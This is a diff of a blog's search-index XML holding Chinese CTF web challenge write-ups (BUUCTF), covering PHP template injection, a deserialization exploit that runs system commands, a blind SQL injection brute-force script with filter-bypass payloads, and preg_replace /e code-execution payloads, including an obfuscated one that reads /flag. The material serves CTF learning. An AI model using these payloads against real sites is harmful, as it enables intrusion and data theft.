class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
       <categories>
         <category>ctf每日一题</category>
       </categories>
@@ -877,31 +868,23 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>rce</tag>
-        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210927</title>
-    <url>/posts/5106ce6b/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><blockquote>
-<p>php模板注入</p>
+    <title>20211015</title>
+    <url>/posts/2348a06e/</url>
+    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
+<p>模板注入</p>
 </blockquote>
-<p>php存在模板注入漏洞，不仅python有，php也有</p>
-<p>该题是通过xff的方式获取的本机ip，在这里测试是否有模板注入，测试49，能执行说明存在，然后cat /flag就行，本来打算反弹个shell玩玩呢，结果一个都不能用。</p>
-<h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><blockquote>
-<p>反序列化绕过</p>
-</blockquote>
-<p>这题本来也想反弹个shell，也是弹了半天没谈过来。。</p>
-<p>直接cat flag也没有，只能find命令了</p>
-<p>先抓包，怀疑可能有call_user_func，随便试了几个都被过滤了，file_get_contents没被禁，获取index.php源码，代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>); <span class="comment"># 过滤了很多函数，剩了个file_get_contents没被禁</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 可以利用反序列化漏洞</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>写出exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;find / -name flag*&quot;</span>; <span class="comment"># 第一部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>; <span class="comment"># 第二部</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>得到pyload: </p>
-<pre><code>func=file_get_contents&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;
-</code></pre>
+<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
+<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings</p>
+<p>可以获得一些设置</p>
+<p>然后成功获得cookie_secret，md5获得hash值即可</p>
+<p>在msg页面可以实现模板注入</p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -909,43 +892,40 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>反序列化</tag>
-        <tag>SSTI</tag>
       </tags>
   </entry>
   <entry>
-    <title>20210928</title>
-    <url>/posts/c1b9d3fa/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
-<p>代码审计 文件包含</p>
+    <title>20210926</title>
+    <url>/posts/2601fefd/</url>
+    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
+<p><a href="https://www.anquanke.com/post/id/85936">https://www.anquanke.com/post/id/85936</a></p>
+<p>这个题呢，最终就是直接跑脚本</p>
+<p>测试1，2会返回两个语句，测试2-1返回1的语句，是数字型注入，然后union发现有waf,fuzz获取过滤的字段，这里学会了怎么用bp进行fuzz，以及fuzzdb这个仓库</p>
+<p>正确的方法是先利用if语句，实现布尔注入。利用括号来绕过空格的过滤。经过测试，用TAB或者%09%0a%0d之类这样的绕过方式也可以成功绕过空格。</p>
+<p>sql的三目运算</p>
+<pre><code>if( 表达式1，表达式2，表达式3)
+</code></pre>
+<p>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p>
+<p>或者异或注入</p>
+<pre><code>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)
+</code></pre>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://4cf19355-75e2-47ba-b522-4ed93121403f.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;</span>:</span><br><span class="line">        sqls = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>看到<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>这个大佬想到了stripos的漏洞</p>
+<blockquote>
+<p>这时候想到stripos函数的一个漏洞。如果没有找到的话返回的是false，如果找到了但是是在字符串的首位，返回的是0。如果后端用了弱类型比较的话，0==false，这样后面就可以使用被过滤的某一个字符串了</p>
 </blockquote>
-<p>先利用data数据流，或者php://input绕过第一个，再利用php://filter读取next.php源码</p>
-<p>这个有个坑，老忘，include php文件时，要用</p>
-<pre><code>file=php://filter/read=convert.base64-encode/resource=next.php
-</code></pre>
-<p>尽心base64编码，否则传不过来。</p>
-<p>代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>进行尝试，</p>
+<p>首先id=1union：</p>
+<p>SQL Injection Checked.</p>
+<p>再试试id=union1union：</p>
+<p>bool(false)</p>
+<p>如果这个题目把括号,tab,以及各种可以充当空格的都给过滤了的话，就用这种方法来绕过空格的过滤。</p>
+<p>不过不知道为啥，每次跑出的flag都不一样，呃呃呃，然后都不能过。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure>
 
-<p>我们先看一下preg_replace用法</p>
-<pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed
-</code></pre>
-<p>搜索subject中匹配pattern的部分，以replacement进行替换。 </p>
-<p>这里又看了看php语法</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> 循环用于遍历数组。</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每进行一次循环，当前数组元素的值就会被赋值给 <span class="variable">$value</span> 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每一次循环，当前数组元素的键与值就都会被赋值给 <span class="variable">$key</span> 和 <span class="variable">$value</span> 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  为 <span class="number">1</span>，对应的 value 为 Google</span><br><span class="line">key  为 <span class="number">2</span>，对应的 value 为 Runoob</span><br><span class="line">key  为 <span class="number">3</span>，对应的 value 为 Taobao</span><br></pre></td></tr></table></figure>
-
-<p>就差不多了，直接构造payload</p>
-<pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
-</code></pre>
-<p>这里还利用了preg_replace /e 模式下的代码执行问题，\S*会匹配到getFlag这个函数</p>
-<pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);
-</code></pre>
-<p>preg_replace 函数在匹配到符号正则的字符串时，会将第二个参数当做代码来执行，即 ‘strtolower(“\1”)’ </p>
-<p>这里的\1就相当于是第一个匹配项，由于\S<em>由</em>（）<em>包裹这里有个<strong>反向引用</strong>，\S</em>匹配的第一个表达式就是${getFlag()}，对其进行代码执行，进而利用这个函数的eval</p>
-<p>还可以直接利用这个漏洞命令执行而不用eval</p>
-<pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;
-</code></pre>
-<p>拼接的</p>
+<p>原来是’-‘被过滤了，测试到-的时候会返回sql注入</p>
+<p>服务器出了点小意外，不能push了，cpu给爆了，不知道为啥。。</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>
 ]]></content>
       <categories>
         <category>ctf每日一题</category>
@@ -953,8 +933,8 @@ Submit
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>代码审计</tag>
-        <tag>文件包含</tag>
+        <tag>sql注入</tag>
+        <tag>测试工具</tag>
       </tags>
   </entry>
   <entry>
@@ -1031,70 +1011,47 @@ Submit
 ]]></content>
   </entry>
   <entry>
-    <title>CUMT初夏赛部分wp</title>
-    <url>/posts/b061f28/</url>
-    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
-<p>这次队友很给力，大佬pwn几乎全做完了，我这个摸鱼选手很惭愧，最后得分听高的，web刷题，在这次有了点收获，最少有思路了，和另一个大佬一交流，就做出来了，最近刷题还是很值得的。</p>
+    <title>20210928</title>
+    <url>/posts/c1b9d3fa/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
+<p>代码审计 文件包含</p>
 </blockquote>
-<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><p>扫码获得压缩包密码，打开后观察文件，将字符串翻转一下，base32解密发现png头，转图片得到flag</p>
-<h2 id="ez-img"><a href="#ez-img" class="headerlink" title="ez_img"></a>ez_img</h2><p>图片明显没显示全，直接爆破高，改高后获得flag</p>
-<h2 id="一个不小的文件"><a href="#一个不小的文件" class="headerlink" title="一个不小的文件"></a>一个不小的文件</h2><p>文件很大，最后=结尾，怀疑base64，观察前几个字符，怀疑base64套娃，直接上脚本获得flag</p>
-<pre><code>#-*- coding:utf-8 -*-
-import base64
-
-s=&#39;&#39;
-with open(&#39;problem.txt&#39;, &#39;r&#39;, encoding=&#39;UTF-8&#39;) as f:
-    s=&quot;&quot;.join(f.readlines()).encode(&#39;utf-8&#39;)
-src=s
-while True:
-    try:
-        src=s
-        s=base64.b64decode(s)
-        str(s,&#39;utf-8&#39;)
-        continue
-    except:
-        pass
-    break
-with open(&#39;result.txt&#39;,&#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
-    file.write(str(src,&#39;utf-8&#39;))
-print(&quot;ok!&quot;)
+<p>先利用data数据流，或者php://input绕过第一个，再利用php://filter读取next.php源码</p>
+<p>这个有个坑，老忘，include php文件时，要用</p>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=next.php
 </code></pre>
-<h2 id="嗷呜"><a href="#嗷呜" class="headerlink" title="嗷呜"></a>嗷呜</h2><p>这个属实被整懵逼了，兽音译者翻译后获得</p>
-<pre><code>fc34f44b75ae100abb2af0e28b9251e5e59b5faf
-</code></pre>
-<p>最后给hint才知道是个p2p种子</p>
-<pre><code>payload：magnet:?xt=urn:btih:fc34f44b75ae100abb2af0e28b9251e5e59b5faf
-</code></pre>
-<p>下载后零宽字符隐写，网站解码获得flag</p>
-<h2 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h2><p>wireshark打开，发现全是USB协议，了解了一下，1.9.1的最后8个字节记录键盘数据，不断在变，直接用tshark提取不出来，对着表一个个对，获得flag</p>
-<h2 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h2><p>直接贴脚本</p>
-<pre><code>def replace_word(l, a):
-    l.remove(a)
-    l.append(a)
-    return l
+<p>尽心base64编码，否则传不过来。</p>
+<p>代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-str = &#39;3 0 @ &#123; o e f m t c y f e o &#123; @ 0 3 a u o r t r o u a 3 o @ &#123; e f y e &#123; @ o 3 a u o r 0 _ i o u e y g a 3 @ h 0 _ t o u e y b 3 a @ _ 0 d c @ a 3 b g e u o f t y g j k z c v f h j k v n m r t u i p k j y t r f v n m d e w o i u h g r k l m u t r e d f h n b f d e u i o p l m n g h y t r e w a q z x c f h j y e s &#125; j h f c x z q a b d e g&#39;
-i_str = list(&#39;cfmteo&#123;@0uya&#39;)
-s_str = str.split(&#39; &#39;)
-flag = []
-
-for i in s_str:
-        if i in i_str:
-            i_str = replace_word(i_str, i)
-        else:
-            a, *i_str = i_str
-            i_str.append(i)
-            flag.append(a)
-        print(i_str)
-print(&#39;&#39;.join(flag))
+<p>我们先看一下preg_replace用法</p>
+<pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed
 </code></pre>
+<p>搜索subject中匹配pattern的部分，以replacement进行替换。 </p>
+<p>这里又看了看php语法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> 循环用于遍历数组。</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每进行一次循环，当前数组元素的值就会被赋值给 <span class="variable">$value</span> 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br><span class="line">每一次循环，当前数组元素的键与值就都会被赋值给 <span class="variable">$key</span> 和 <span class="variable">$value</span> 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  为 &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;，对应的 value 为 &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  为 <span class="number">1</span>，对应的 value 为 Google</span><br><span class="line">key  为 <span class="number">2</span>，对应的 value 为 Runoob</span><br><span class="line">key  为 <span class="number">3</span>，对应的 value 为 Taobao</span><br></pre></td></tr></table></figure>
+
+<p>就差不多了，直接构造payload</p>
+<pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);
+</code></pre>
+<p>这里还利用了preg_replace /e 模式下的代码执行问题，\S*会匹配到getFlag这个函数</p>
+<pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);
+</code></pre>
+<p>preg_replace 函数在匹配到符号正则的字符串时，会将第二个参数当做代码来执行，即 ‘strtolower(“\1”)’ </p>
+<p>这里的\1就相当于是第一个匹配项，由于\S<em>由</em>（）<em>包裹这里有个<strong>反向引用</strong>，\S</em>匹配的第一个表达式就是${getFlag()}，对其进行代码执行，进而利用这个函数的eval</p>
+<p>还可以直接利用这个漏洞命令执行而不用eval</p>
+<pre><code>?\S*=$&#123;system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))&#125;
+</code></pre>
+<p>拼接的</p>
 ]]></content>
       <categories>
-        <category>ctf学习</category>
+        <category>ctf每日一题</category>
       </categories>
       <tags>
         <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1197,45 +1154,108 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>python学习笔记</title>
-    <url>/posts/743c31e9/</url>
-    <content><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><ul>
-<li>number</li>
-<li>string</li>
-<li>list</li>
-<li>tuple</li>
-<li>set</li>
-<li>dict</li>
-</ul>
-<p>num string tuple 可变</p>
-<p>list dict set 不可变</p>
-<h4 id="num"><a href="#num" class="headerlink" title="num"></a>num</h4><p>type() 查看类型</p>
-<p>del删除对象</p>
-<pre><code>del var
-del var_a, var_b
+    <title>CUMT初夏赛部分wp</title>
+    <url>/posts/b061f28/</url>
+    <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
+<p>这次队友很给力，大佬pwn几乎全做完了，我这个摸鱼选手很惭愧，最后得分听高的，web刷题，在这次有了点收获，最少有思路了，和另一个大佬一交流，就做出来了，最近刷题还是很值得的。</p>
+</blockquote>
+<h2 id="ez-base"><a href="#ez-base" class="headerlink" title="ez_base"></a>ez_base</h2><p>扫码获得压缩包密码，打开后观察文件，将字符串翻转一下，base32解密发现png头，转图片得到flag</p>
+<h2 id="ez-img"><a href="#ez-img" class="headerlink" title="ez_img"></a>ez_img</h2><p>图片明显没显示全，直接爆破高，改高后获得flag</p>
